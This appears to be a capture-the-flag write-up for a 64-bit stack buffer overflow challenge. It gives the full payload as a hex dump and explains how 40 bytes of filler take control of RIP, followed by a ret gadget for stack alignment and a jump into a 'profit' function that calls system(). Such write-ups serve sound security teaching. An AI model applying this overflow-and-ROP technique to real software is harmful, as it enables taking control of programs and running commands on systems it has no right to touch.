# solution
Payload we need to send to the tool is:
```
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00000020  42 42 42 42 42 42 42 42  c6 05 40 00 00 00 00 00  |BBBBBBBB..@.....|
00000030  c7 05 40 00 00 00 00 00  0a                       |..@......|
00000039
```

The 0x41 overflow the buffer and after 0x28 * "A" we have control of RIP.

We create a mini ROP chain consisting of a retnop to 0x4005c6, which ensures our 64 bit stack is properly aligned.
Then we just jump into the "secret" function "profit" at 0x4005c7 which conveniently calls system() for us.

See solve.sh and solution.py.